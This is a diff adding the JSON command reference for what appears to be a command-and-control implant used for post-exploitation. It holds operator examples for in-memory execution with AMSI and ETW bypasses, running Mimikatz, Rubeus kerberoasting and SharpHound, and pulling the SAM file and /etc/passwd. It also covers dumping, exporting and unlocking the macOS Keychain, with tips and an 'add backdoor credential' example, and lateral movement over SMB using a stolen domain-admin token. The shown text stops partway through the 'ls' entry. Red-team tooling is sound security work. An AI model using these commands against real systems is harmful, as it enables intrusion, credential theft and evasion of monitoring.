@@ -1,0 +1,1102 @@
+{
+  "commands": [
+    {
+      "id": "bof",
+      "name": "bof",
+      "description": "Execute a Beacon Object File (BOF) with arguments",
+      "syntax": "bof <path_to_bof.o> [arguments...]\nbof <path_to_bof.o>                       # Execute BOF without arguments\nbof <path_to_bof.o> arg1 arg2             # Execute with string arguments\nbof <path_to_bof.o> -i:123 -s:hello        # Execute with typed arguments",
+      "examples": [
+        "bof /path/to/whoami.x64.o",
+        "bof /path/to/dir.x64.o C:\\Windows\\System32",
+        "bof /path/to/netuser.x64.o -w:Administrator -w:DOMAIN",
+        "bof /path/to/portscan.x64.o -s:192.168.1.0/24 -i:445"
+      ],
+      "help": "Executes a Beacon Object File (BOF) in the agent's memory:\n- First argument must be path to a .o (COFF) file\n- Supports x64 and x86 BOF files\n- Arguments can be passed in different formats:\n  * Plain strings: treated as string arguments\n  * -s:value : String argument\n  * -w:value : Wide string (Unicode) argument\n  * -i:value : Integer argument (32-bit)\n  * -I:value : Integer argument (64-bit)\n  * -z:value : Binary data (base64 encoded)\n  * -Z:value : Binary data with size prefix\n- BOFs run in the agent's process memory\n- Output is captured and returned\n- Crashes in BOFs are isolated (with async mode)\n",
+      "category": "execution",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "bof-async",
+      "name": "bof-async",
+      "description": "Execute a BOF asynchronously in a separate thread",
+      "syntax": "bof-async <path_to_bof.o> [arguments...]\nbof-async <path_to_bof.o>                 # Execute async without arguments\nbof-async <path_to_bof.o> arg1 arg2       # Execute async with arguments",
+      "examples": [
+        "bof-async /path/to/long_running.x64.o",
+        "bof-async /path/to/scanner.x64.o 192.168.1.0/24 1-1000",
+        "bof-async /path/to/keylogger.x64.o 60"
+      ],
+      "help": "Executes a BOF asynchronously in a separate thread:\n- Same argument format as regular 'bof' command\n- BOF runs in background without blocking agent\n- Each async BOF gets a unique job ID\n- Use 'bof-jobs' to list running BOFs\n- Use 'bof-output <job_id>' to get output\n- Use 'bof-kill <job_id>' to terminate\n- Crashes won't affect the main agent process\n",
+      "category": "execution",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "bof-jobs",
+      "name": "bof-jobs",
+      "description": "List all running asynchronous BOF jobs",
+      "syntax": "bof-jobs",
+      "examples": [
+        "bof-jobs"
+      ],
+      "help": "Shows all currently running asynchronous BOF jobs:\n- Lists job ID, BOF name, status, and start time\n- Shows memory usage for each job\n- Indicates if output is available\n",
+      "category": "execution",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "bof-kill",
+      "name": "bof-kill",
+      "description": "Terminate an async BOF job",
+      "syntax": "bof-kill <job_id>",
+      "examples": [
+        "bof-kill 1",
+        "bof-kill 3"
+      ],
+      "help": "Forcefully terminates an async BOF job:\n- Requires valid job ID from 'bof-jobs'\n- Cleans up allocated memory\n- Returns any remaining output\n- Job cannot be restarted\n",
+      "category": "execution",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "bof-output",
+      "name": "bof-output",
+      "description": "Retrieve output from an async BOF job",
+      "syntax": "bof-output <job_id>",
+      "examples": [
+        "bof-output 1",
+        "bof-output 5"
+      ],
+      "help": "Retrieves accumulated output from an async BOF job:\n- Requires valid job ID from 'bof-jobs'\n- Returns all output since last retrieval\n- Does not terminate the job\n",
+      "category": "execution",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "cat",
+      "name": "cat",
+      "description": "Display file contents with optional filtering",
+      "syntax": "cat <file>                     # Display entire file\ncat <file> -f <pattern>        # Filter lines containing pattern (case-sensitive)\ncat <file> -i <pattern>        # Case-insensitive filter",
+      "examples": [
+        "cat /etc/passwd",
+        "cat config.txt -f error       # Show lines containing 'error' (case-sensitive)",
+        "cat log.txt -i warning        # Case-insensitive search for 'warning'",
+        "cat data.csv -f ,admin,       # Find lines with ',admin,'",
+        "cat app.log -f ERROR:*        # Lines starting with 'ERROR:'",
+        "cat test.txt -i *warn*      # Lines containing 'warn' anywhere (case-insensitive)",
+        "cat file.txt -f *success    # Lines ending with 'success'",
+        "cat data.log -f user?id     # Match 'userid' or 'user-id' etc (? = any single char)",
+        "cat error.log -f *[ERROR]*  # Lines containing '[ERROR]' anywhere"
+      ],
+      "help": "Displays file contents with optional filtering:\n- Reads and outputs entire file by default\n- Use -f for case-sensitive pattern matching\n- Use -i for case-insensitive pattern matching\n- Supports wildcards:\n  * = matches any sequence of characters\n  ? = matches exactly one character\n  *pattern* = matches pattern anywhere in line\n- Pattern matching searches each line\n- File must be readable by the agent process\n- Output includes line numbers when filtering (format: linenum:content)\n",
+      "category": "file",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "cd",
+      "name": "cd",
+      "description": "Change working directory",
+      "syntax": "cd <path>",
+      "examples": [
+        "cd C:\\Users",
+        "cd /home/user",
+        "cd .."
+      ],
+      "help": "Changes current working directory on target system",
+      "category": "file",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "clear",
+      "name": "clear",
+      "description": "Clear pending commands for the agent",
+      "syntax": "clear",
+      "examples": [
+        "clear"
+      ],
+      "help": "Clears all pending commands for the agent except for file transfers:\n- Removes non-file-transfer commands from queue\n- Keeps 'upload' and 'download' commands intact\n- Useful for canceling queued commands\n",
+      "category": "utility",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "cna_list",
+      "name": "cna-list",
+      "description": "List loaded CNA scripts and their commands",
+      "syntax": "cna-list",
+      "examples": [
+        "cna-list"
+      ],
+      "help": "Shows all currently loaded CNA scripts and the commands they provide",
+      "category": "utility",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "cna_load",
+      "name": "cna-load",
+      "description": "Load a Cobalt Strike Aggressor (CNA) script",
+      "syntax": "cna-load <path_to_cna_file>",
+      "examples": [
+        "cna-load /path/to/bof.cna",
+        "cna-load ~/tools/trustedsec-bofs/bof.cna"
+      ],
+      "help": "Loads a Cobalt Strike Aggressor (CNA) script file and registers its commands.\nThis allows you to use BOF collections that come with CNA scripts.\n\nThe interpreter will:\n- Parse beacon_command_register declarations\n- Extract alias definitions\n- Map commands to their BOF implementations\n- Auto-locate BOF files relative to the CNA script\n\nSupported CNA features:\n- beacon_command_register\n- beacon_inline_execute\n- alias definitions\n- bof_pack argument packing\n- readbof BOF file loading\n- Basic conditionals (iff)\n- Logging (btask, blog, berror)\n\nNote: This is a subset implementation of the CNA language focused on BOF integration.\n",
+      "category": "utility",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "download",
+      "name": "download",
+      "description": "Download a file from the target system",
+      "syntax": "download <filename>",
+      "examples": [
+        "download C:\\Windows\\System32\\config\\SAM ./sam.bak",
+        "download /etc/passwd ./passwd.txt"
+      ],
+      "help": "Retrieves a file from target system:\n- Remote file must exist and be readable\n",
+      "category": "file",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "env",
+      "name": "env",
+      "description": "Display, set, or remove environment variables",
+      "syntax": "env                        # Display all environment variables\nenv <VAR_NAME>            # Display specific variable\nenv <VAR_NAME>=<VALUE>    # Set environment variable\nenv -u <VAR_NAME>         # Unset/remove environment variable",
+      "examples": [
+        "env                    # Show all environment variables",
+        "env PATH               # Show PATH variable",
+        "env CUSTOM_VAR=test    # Set CUSTOM_VAR to 'test'",
+        "env -u CUSTOM_VAR      # Remove CUSTOM_VAR"
+      ],
+      "help": "Manages environment variables in the current session:\n- No arguments: displays all environment variables\n- Single argument (VAR_NAME): displays specific variable value\n- VAR_NAME=VALUE format: sets environment variable for the session\n- -u: removes an environment variable\n- Changes are session-specific and don't persist after agent restart\n",
+      "category": "info",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "execute_assembly",
+      "name": "execute-assembly",
+      "description": "Alias for inline-assembly command",
+      "syntax": "execute-assembly <path_to_assembly> [arguments...]",
+      "examples": [
+        "execute-assembly /path/to/Rubeus.exe kerberoast",
+        "execute-assembly /path/to/Seatbelt.exe -group=all"
+      ],
+      "help": "Alias for inline-assembly command. See 'help inline-assembly' for full documentation.\n\nThis alias is provided for compatibility with other C2 frameworks.\nAll functionality is identical to inline-assembly.\n",
+      "category": "execution",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "exit",
+      "name": "exit",
+      "description": "Gracefully exit/kill the agent",
+      "syntax": "exit",
+      "examples": [
+        "exit"
+      ],
+      "help": "Gracefully stops the agent:\n- Cleans up active jobs\n- Removes temporary files\n- Stops running services\n- Exits process cleanly\n",
+      "category": "utility",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "hash",
+      "name": "hash",
+      "description": "Calculate MD5 or SHA256 hash of files",
+      "syntax": "hash <file_path> [algorithm]",
+      "examples": [
+        "hash /etc/passwd",
+        "hash /etc/passwd sha256",
+        "hash /etc/passwd md5",
+        "hash /etc/passwd all",
+        "hash C:\\Windows\\System32\\notepad.exe",
+        "hash ./document.pdf all",
+        "hash config.json md5"
+      ],
+      "help": "Calculate cryptographic hashes of files on the target system.\n\nAlgorithms:\n  - md5: Calculate MD5 hash (128-bit)\n  - sha256: Calculate SHA256 hash (256-bit) [DEFAULT]\n  - all: Calculate both MD5 and SHA256\n\nFeatures:\n  - Supports absolute and relative paths\n  - Works on all operating systems\n  - Efficient streaming for large files\n  - Clear error reporting\n",
+      "category": "token",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "hashdir",
+      "name": "hashdir",
+      "description": "Recursively hash files in a directory",
+      "syntax": "hashdir <directory_path> [algorithm] [pattern]",
+      "examples": [
+        "hashdir /var/log",
+        "hashdir /bin md5",
+        "hashdir C:\\Windows\\System32 sha256 *.exe",
+        "hashdir ./downloads all *.pdf",
+        "hashdir /home/user sha256 *.conf"
+      ],
+      "help": "Recursively calculate hashes for multiple files in a directory.\n\nParameters:\n  - directory_path: Target directory to scan\n  - algorithm: Hash algorithm (md5/sha256) [DEFAULT: sha256]\n  - pattern: File pattern to match [DEFAULT: *]\n\nFeatures:\n  - Recursive directory traversal\n  - Pattern matching for selective hashing\n  - Batch processing with progress\n  - Error handling for inaccessible files\n\nOutput includes:\n  - Hash value and relative file path\n  - Summary of files processed\n  - Error count for failed files\n",
+      "category": "utility",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "help",
+      "name": "help",
+      "description": "Show general help or details for a specific command",
+      "syntax": "help                     # Show all commands with a short description\nhelp <command>           # Show detailed help for a specific command",
+      "examples": [
+        "help",
+        "help upload",
+        "help socks"
+      ],
+      "help": "Client-side help viewer:\n- 'help' prints all available commands with a short description.\n- 'help <command>' prints detailed help using the fields in commands.toml:\n  name, description, syntax, examples, and help.\nThis never goes to the server and is rendered instantly in the terminal.\n",
+      "category": "utility",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "inline_assembly",
+      "name": "inline-assembly",
+      "description": "Execute a .NET assembly in memory without creating new processes",
+      "syntax": "inline-assembly <path_to_assembly> [arguments...]\ninline-assembly <path_to_assembly>                    # Execute without arguments\ninline-assembly <path_to_assembly> arg1 arg2          # Execute with arguments\ninline-assembly <path_to_assembly> --amsi             # Enable AMSI bypass\ninline-assembly <path_to_assembly> --etw              # Enable ETW bypass\ninline-assembly <path_to_assembly> --amsi --etw       # Enable both bypasses\ninline-assembly <path_to_assembly> --revert-etw       # Revert ETW after execution\ninline-assembly <path_to_assembly> --app-domain NAME  # Specify AppDomain name",
+      "examples": [
+        "inline-assembly /path/to/Seatbelt.exe -group=all",
+        "inline-assembly /path/to/SharpUp.exe",
+        "inline-assembly /path/to/Rubeus.exe --amsi kerberoast",
+        "inline-assembly /path/to/SharpHound.exe --etw -c all",
+        "inline-assembly /path/to/Mimikatz.exe --amsi --etw coffee",
+        "inline-assembly /path/to/Watson.exe --app-domain MyDomain",
+        "inline-assembly /path/to/Custom.exe --amsi --revert-etw"
+      ],
+      "help": "Executes .NET assemblies in memory without touching disk:\n\nOPTIONS:\n  --amsi              Enable AMSI bypass before execution\n  --etw               Enable ETW bypass before execution  \n  --revert-etw        Revert ETW patches after execution\n  --app-domain <name> Specify AppDomain name (default: InlineAssembly)\n\nEXECUTION METHODS (Windows):\n1. C# wrapper compilation for output capture\n2. PowerShell fallback if csc.exe unavailable\n3. Direct CLR hosting via ICLRRuntimeHost\n4. Windows API pipe redirection for stdout/stderr\n\nEXAMPLES:\n  # Safe execution (no bypasses)\n  inline-assembly /path/to/Seatbelt.exe -group=all\n  \n  # With AMSI bypass for tools that need it\n  inline-assembly /path/to/Rubeus.exe --amsi kerberoast\n  \n  # With ETW bypass for monitoring evasion\n  inline-assembly /path/to/SharpHound.exe --etw -c all\n  \n  # With both bypasses for high-risk tools\n  inline-assembly /path/to/Mimikatz.exe --amsi --etw coffee\n  \n  # Custom AppDomain\n  inline-assembly /path/to/Tool.exe --app-domain CustomDomain\n",
+      "category": "utility",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "inline_assembly_async",
+      "name": "inline-assembly-async",
+      "description": "Execute a .NET assembly asynchronously in a separate thread",
+      "syntax": "inline-assembly-async <path_to_assembly> [arguments...]\ninline-assembly-async <path_to_assembly>              # Execute async without arguments\ninline-assembly-async <path_to_assembly> arg1 arg2    # Execute async with arguments\ninline-assembly-async <path_to_assembly> --amsi       # Async with AMSI bypass\ninline-assembly-async <path_to_assembly> --etw        # Async with ETW bypass",
+      "examples": [
+        "inline-assembly-async /path/to/SharpHound.exe -c all",
+        "inline-assembly-async /path/to/LongRunning.exe",
+        "inline-assembly-async /path/to/Scanner.exe --amsi 192.168.1.0/24",
+        "inline-assembly-async /path/to/Monitor.exe --etw --app-domain Monitor"
+      ],
+      "help": "Executes .NET assemblies asynchronously in background:\n\nFEATURES:\n- Same capabilities as inline-assembly but non-blocking\n- Runs in separate thread without blocking agent\n- Each async execution gets a unique job ID\n- Output buffered for later retrieval\n\nOPTIONS:\n  Same as inline-assembly:\n  --amsi              Enable AMSI bypass\n  --etw               Enable ETW bypass\n  --revert-etw        Revert ETW patches\n  --app-domain <name> Specify AppDomain name\n\nJOB MANAGEMENT:\n- Use 'inline-assembly-jobs' to list running assemblies\n- Use 'inline-assembly-output <job_id>' to get output\n- Use 'inline-assembly-kill <job_id>' to terminate\n\nEXAMPLES:\n  # Long-running collection tool\n  inline-assembly-async /path/to/SharpHound.exe -c all\n  \n  # Background scanner with AMSI bypass\n  inline-assembly-async /path/to/Scanner.exe --amsi 10.0.0.0/8\n  \n  # Monitor with ETW bypass\n  inline-assembly-async /path/to/EventMon.exe --etw\n",
+      "category": "utility",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "inline_assembly_jobs",
+      "name": "inline-assembly-jobs",
+      "description": "List all running asynchronous assembly jobs",
+      "syntax": "inline-assembly-jobs",
+      "examples": [
+        "inline-assembly-jobs"
+      ],
+      "help": "Shows all currently running asynchronous .NET assembly jobs:\n\nUSAGE:\n  inline-assembly-jobs              # List all jobs\n\nNOTES:\n- Jobs persist until output is retrieved or killed\n- Completed jobs show 'Completed' status\n- Failed jobs show error information\n",
+      "category": "utility",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "inline_assembly_jobs_clean",
+      "name": "inline-assembly-jobs-clean",
+      "description": "Clean up completed, killed, or failed assembly jobs from memory",
+      "syntax": "inline-assembly-jobs-clean                # Clean all non-running jobs\ninline-assembly-jobs-clean <job_id>       # Clean specific job (if not running)",
+      "examples": [
+        "inline-assembly-jobs-clean",
+        "inline-assembly-jobs-clean inline_asm_1755706455548",
+        "inline-assembly-jobs-clean 1755706455548"
+      ],
+      "help": "Removes completed, killed, failed, or timed-out assembly jobs from memory:\n\nFEATURES:\n- Cleans up job tracking to free memory\n- Prevents job list from growing too large\n- Cannot clean running jobs (must kill first)\n- Supports partial job ID matching\n\nUSAGE:\n  inline-assembly-jobs-clean              # Remove ALL non-running jobs\n  inline-assembly-jobs-clean <job_id>     # Remove specific job if not running\n  \nEXAMPLES:\n  # Clean all completed/killed/failed jobs\n  inline-assembly-jobs-clean\n  \n  # Clean specific job by ID\n  inline-assembly-jobs-clean inline_asm_1755706455548\n  \n  # Clean using partial ID\n  inline-assembly-jobs-clean 1755706455548\n",
+      "category": "utility",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "inline_assembly_jobs_stats",
+      "name": "inline-assembly-jobs-stats",
+      "description": "Display statistics about assembly jobs",
+      "syntax": "inline-assembly-jobs-stats",
+      "examples": [
+        "inline-assembly-jobs-stats"
+      ],
+      "help": "Shows statistical summary of all assembly jobs in memory:\n\nDISPLAYED INFORMATION:\n- Total number of jobs\n- Count of running jobs\n- Count of completed jobs\n- Count of failed jobs\n- Count of killed jobs\n- Count of timeout jobs\n\nUSAGE:\n  inline-assembly-jobs-stats              # Show job statistics\n",
+      "category": "utility",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "inline_assembly_kill",
+      "name": "inline-assembly-kill",
+      "description": "Terminate an async assembly job",
+      "syntax": "inline-assembly-kill <job_id>",
+      "examples": [
+        "inline-assembly-kill 1",
+        "inline-assembly-kill 3"
+      ],
+      "help": "Forcefully terminates an async assembly job:\n\nUSAGE:\n  inline-assembly-kill <job_id>     # Kill specific job\n  \nEXAMPLES:\n  inline-assembly-kill 1            # Terminate job 1\n  inline-assembly-kill 5            # Terminate job 5\n",
+      "category": "process",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "inline_assembly_output",
+      "name": "inline-assembly-output",
+      "description": "Retrieve output from an async assembly job",
+      "syntax": "inline-assembly-output <job_id>",
+      "examples": [
+        "inline-assembly-output 1",
+        "inline-assembly-output 3"
+      ],
+      "help": "Retrieves accumulated output from an async assembly job:\n\nUSAGE:\n  inline-assembly-output <job_id>   # Get output from specific job\n  \nEXAMPLES:\n  inline-assembly-output 1          # Get output from job 1\n  inline-assembly-output 5          # Get output from job 5\n",
+      "category": "utility",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "inline_execute",
+      "name": "inline-execute",
+      "description": "Alias for inline-assembly command",
+      "syntax": "inline-execute <path_to_assembly> [arguments...]",
+      "examples": [
+        "inline-execute /path/to/SharpUp.exe",
+        "inline-execute /path/to/Watson.exe"
+      ],
+      "help": "Alias for inline-assembly command. See 'help inline-assembly' for full documentation.\n\nThis alias is provided as a shorter alternative to inline-assembly.\nAll functionality is identical to inline-assembly.\n",
+      "category": "execution",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "jobkill",
+      "name": "jobkill",
+      "description": "Kill an active file transfer job",
+      "syntax": "jobkill <job_id>",
+      "examples": [
+        "jobkill 1",
+        "jobkill 3"
+      ],
+      "help": "Terminates an active file transfer job:\n- Requires a valid job ID from 'jobs' command\n- Stops both uploads and downloads\n- Cleans up any partial transfers\n- Job ID must be a number\n",
+      "category": "utility",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "jobs",
+      "name": "jobs",
+      "description": "List all active file transfer jobs",
+      "syntax": "jobs",
+      "examples": [
+        "jobs"
+      ],
+      "help": "Shows all active file transfers:\n- Lists ongoing uploads and downloads\n- Shows progress for each transfer\n- Displays job IDs for tracking\n",
+      "category": "utility",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "keychain",
+      "name": "keychain",
+      "description": "Access and manipulate macOS Keychain items",
+      "syntax": "keychain list\nkeychain dump [--keychain <keychain_path>]\nkeychain search [--service <service>] [--account <account>] [--label <label>]\nkeychain add --service <service> --account <account> --password <password>\nkeychain delete --service <service> --account <account>\nkeychain export --keychain <path> --output <file>\nkeychain unlock --keychain <path> --password <password>",
+      "examples": [
+        "keychain list",
+        "keychain dump",
+        "keychain dump --keychain login.keychain-db",
+        "keychain search --service gmail",
+        "keychain search --account admin@company.com",
+        "keychain search --service outlook --account user@outlook.com",
+        "keychain add --service myapp --account admin --password SecretPass123",
+        "keychain delete --service myapp --account admin",
+        "keychain export --keychain login.keychain-db --output /tmp/keychain.txt",
+        "keychain unlock --keychain login.keychain-db --password MyPassword"
+      ],
+      "help": "Accesses and manipulates macOS Keychain:\n\nACTIONS:\n\n1. LIST - Show available keychains:\n   - Lists all keychains in search path\n   - Shows default login keychain\n   - Checks accessibility of each keychain\n   - Lists keychains in ~/Library/Keychains/\n\n2. DUMP - Extract keychain contents:\n   - Options:\n     --keychain <path>  Specific keychain (default: login keychain)\n   - Dumps generic passwords\n   - Dumps internet passwords\n   - Lists certificates\n   - Note: Keychain must be unlocked\n   - Passwords shown in plaintext when accessible\n\n3. SEARCH - Find specific items:\n   - Options:\n     --service <name>   Service/application name\n     --account <name>   Account username\n     --label <label>    Item label\n   - Searches both generic and internet passwords\n   - Shows password if accessible\n   - Can combine search criteria\n\n4. ADD - Create keychain item:\n   - Options:\n     --service <name>   Service name (required)\n     --account <name>   Account name (required)\n     --password <pass>  Password (required)\n   - Adds generic password entry\n   - Allows access by all applications\n\n5. DELETE - Remove keychain item:\n   - Options:\n     --service <name>   Service name\n     --account <name>   Account name\n   - At least one option required\n   - Removes matching items\n\n6. EXPORT - Export keychain data:\n   - Options:\n     --keychain <path>  Source keychain (required)\n     --output <file>    Output file (required)\n   - Attempts PKCS12 export first\n   - Falls back to text dump if needed\n   - Exported data includes passwords\n\n7. UNLOCK - Unlock a keychain:\n   - Options:\n     --keychain <path>  Keychain to unlock (default: login)\n     --password <pass>  Keychain password (required)\n   - Allows access to protected items\n   - Unlock persists for session\n\nKEYCHAIN TYPES:\n- login.keychain-db: User's default keychain\n- System.keychain: System-wide keychain (requires root)\n- iCloud Keychain: Synced items (limited access)\n- Custom keychains: User-created keychains\n\nCOMMON PASSWORDS FOUND:\n- Web passwords (Safari, Chrome)\n- Email account passwords\n- WiFi passwords (System keychain)\n- Application passwords\n- SSH keys passphrases\n- Certificate private keys\n- Token/API keys\n\nSECURITY NOTES:\n- Modern macOS requires user approval for keychain access\n- Some items protected by TouchID/password\n- System keychain requires root access\n- Keychain dumping logged by endpoint security\n- TCC protections may prevent access\n\nOPERATIONAL TIPS:\n- Unlock keychain first for full access\n- Search for specific services of interest\n- Export for offline analysis\n- Check all available keychains\n- Look for plaintext passwords in dumps\n\nEXAMPLES:\n  # List all keychains\n  keychain list\n  \n  # Dump default keychain (must be unlocked)\n  keychain dump\n  \n  # Search for email passwords\n  keychain search --service gmail\n  keychain search --service outlook\n  keychain search --service mail\n  \n  # Search for specific account\n  keychain search --account admin@target.com\n  \n  # Add backdoor credential\n  keychain add --service backdoor --account admin --password infected\n  \n  # Export for offline analysis\n  keychain export --keychain login.keychain-db --output /tmp/creds.txt\n  \n  # Unlock with known password\n  keychain unlock --password UserPassword123\n",
+      "category": "utility",
+      "os": [
+        "darwin"
+      ],
+      "platforms": {
+        "windows": false,
+        "linux": false,
+        "macos": true
+      }
+    },
+    {
+      "id": "link",
+      "name": "link",
+      "description": "Link to a remote agent for lateral movement",
+      "syntax": "link <protocol> <target_host> [options]\nlink smb <target_host> [pipe_name]    # Connect via SMB named pipe",
+      "examples": [
+        "link smb 192.168.1.50 spoolss",
+        "link smb dc01.corp.local netlogon",
+        "link smb localhost customPipe",
+        "link smb 10.0.0.5"
+      ],
+      "help": "Connects to a link agent running on a remote host for lateral movement.\n\nThis command enables lateral movement by linking an HTTPS \"edge\" agent to a\n\"link\" agent deployed on another machine. The link agent communicates\nback to the server through the edge agent, creating a chain.\n\nPROTOCOLS:\n  smb    Connect via SMB named pipe (port 445)\n         Future: Additional protocols will be added (tcp, etc.)\n\nREQUIREMENTS:\n- The calling agent must be an HTTPS (edge) agent\n- Network access to the target host on the protocol's port\n- Valid credentials for authentication (use token impersonation if needed)\n- A link agent must be running on the target and listening\n\nSMB PIPE NAME:\n- If not specified, defaults to 'spoolss'\n- View configured pipe names in the Listeners panel (View > Show Listeners)\n- Common pipes: spoolss, netlogon, lsarpc, samr, browser\n- Custom pipe names can be specified when building the SMB payload\n\nARCHITECTURE:\n  [Server] <--HTTPS--> [Edge Agent] <--Protocol--> [Link Agent]\n\n  The edge agent acts as a relay, forwarding encrypted traffic between\n  the server and the link agent. All communication is end-to-end\n  encrypted - the edge agent cannot read the link agent's traffic.\n\nAUTHENTICATION:\n  Connections use the current security context. To connect with\n  different credentials, first impersonate the appropriate token:\n\n  token steal 1234 domain-admin        # Steal domain admin token\n  link smb dc01.corp.local spoolss     # Connect as domain admin\n\n  Or use make-token/token create for explicit credentials:\n\n  token create CORP\\admin P@ssw0rd admin-tok\n  token use admin-tok\n  link smb fileserver.corp.local spoolss\n\nMULTI-HOP CHAINS:\n  Link agents can themselves link to other link agents, creating\n  multi-hop chains for deep network penetration:\n\n  Server <-> EdgeAgent <-> LinkAgent1 <-> LinkAgent2 <-> LinkAgent3\n\nEXAMPLES:\n  # Basic link to an SMB agent\n  link smb 192.168.1.50 spoolss\n\n  # Link using FQDN\n  link smb dc01.corp.local netlogon\n\n  # Link with token impersonation for authentication\n  token steal 1752 domain-admin\n  link smb 10.0.0.100 spoolss\n\n  # Link using default pipe name (spoolss)\n  link smb workstation01\n\nTROUBLESHOOTING:\n  - \"Access denied\": Check credentials/token context\n  - \"Pipe not found\": Verify link agent is running and pipe name matches\n  - \"Network path not found\": Check target host is reachable\n  - \"Connection timeout\": Firewall may be blocking traffic\n",
+      "category": "network",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "links",
+      "name": "links",
+      "description": "List all active SMB link connections from this agent",
+      "syntax": "links",
+      "examples": [
+        "links"
+      ],
+      "help": "Lists all active SMB pipe connections from this edge agent.\n\nOUTPUT COLUMNS:\n  ID        Routing ID for the linked agent (use with 'unlink')\n  Target    Pipe path of the connected SMB agent\n  Status    Connection status (connected, disconnected)\n  Linked    Timestamp when the link was established\n\nUSAGE:\n  Use this command to see which SMB agents are currently connected\n  through this edge agent. The routing ID shown can be used with\n  'unlink' to disconnect specific agents.\n\nEXAMPLE OUTPUT:\n  ID    Target                        Status      Linked\n  ---   --------------------------    ----------  -------------------\n  1     \\\\192.168.1.50\\pipe\\spoolss   connected   2024-01-15 10:30:00\n  2     \\\\dc01\\pipe\\netlogon          connected   2024-01-15 10:32:15\n",
+      "category": "network",
+      "os": [
+        "windows"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "ls",
+      "name": "ls",
+      "description": "List directory contents with optional filtering",
+      "syntax": "ls [-a] [-h] [-R] [--max-depth=N] [--count] [-f pattern]... [-i pattern]... [--exclude pattern]... [path]",
+      "examples": [
+        "ls",
+        "ls -a",
+        "ls /etc",
+        "ls -h",
+        "ls -R /home/user",
+        "ls -ahR ~/Documents",
+        "ls -R --max-depth=2",
+        "ls -R --max-depth=1 /var",
+        "ls -ahR --max-depth=3",
+        "ls --count",
+        "ls -R --count",
+        "ls -a --count",
+        "ls -R --max-depth=2 --count",
+        "ls -f .log --count",
+        "ls -f .go -f .md",
+        "ls -f .js -f .ts --exclude node_modules",
+        "ls -R --exclude .git --exclude target",
+        "ls -a -f .config",
+        "ls -i CONFIG /etc",
+        "ls -hR -f .go /usr/src",
+        "ls -R --max-depth=2 -f .log",
+        "ls --filter test",
+        "ls --filter-ignore readme"
+      ],
